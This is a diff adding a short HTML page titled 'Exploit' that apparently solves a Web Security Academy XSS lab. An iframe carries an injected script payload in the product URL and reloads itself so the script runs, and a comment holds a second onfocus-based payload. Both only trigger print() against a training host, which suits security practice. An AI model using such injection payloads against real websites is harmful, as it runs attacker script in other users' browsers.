@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Exploit</title>
+
+    <script type="text/javascript">    
+        function loadNew() {        
+            var my_frame = document.getElementById("xploit_iframe");
+
+            if (!window.x) {
+                // set the cookie
+                my_frame.src = "https://0a8d001003c7c91bc166a849002100c0.web-security-academy.net/";
+                window.x=1;
+            }
+        }
+    </script>
+</head>
+<body>
+
+<!--
+src="https://0a8d001003c7c91bc166a849002100c0.web-security-academy.net/product?productId=3&'+autofocus+onfocus='print()"
+onload="if(!window.x)this.src='https://0a8d001003c7c91bc166a849002100c0.web-security-academy.net/';window.x=1"
+-->
+
+<iframe id="xploit_iframe" height="500" width="500"  
+src="https://0a8d001003c7c91bc166a849002100c0.web-security-academy.net/product?productId=3&'><script>print()</script>"
+onload='loadNew()'
+>
+
+
+</body>
+</html>
